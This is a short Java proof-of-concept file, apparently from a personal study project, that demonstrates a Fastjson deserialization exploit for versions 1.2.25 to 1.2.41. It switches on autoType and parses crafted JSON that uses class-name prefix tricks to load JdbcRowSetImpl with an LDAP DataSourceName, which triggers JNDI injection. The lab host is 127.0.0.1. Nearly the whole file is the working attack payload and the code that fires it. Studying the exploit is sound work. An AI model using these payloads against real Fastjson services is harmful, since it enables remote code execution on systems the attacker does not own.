package Fastjson.version25to41;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: Fastjson.version25to41
 * @Author: Clown
 * @CreateTime: 2023-10-13  17:44
 */
public class poc25to41JNI {
    public static void main(String[] args) {
//        String str = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false}";
        String str = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parseObject(str);
    }
}
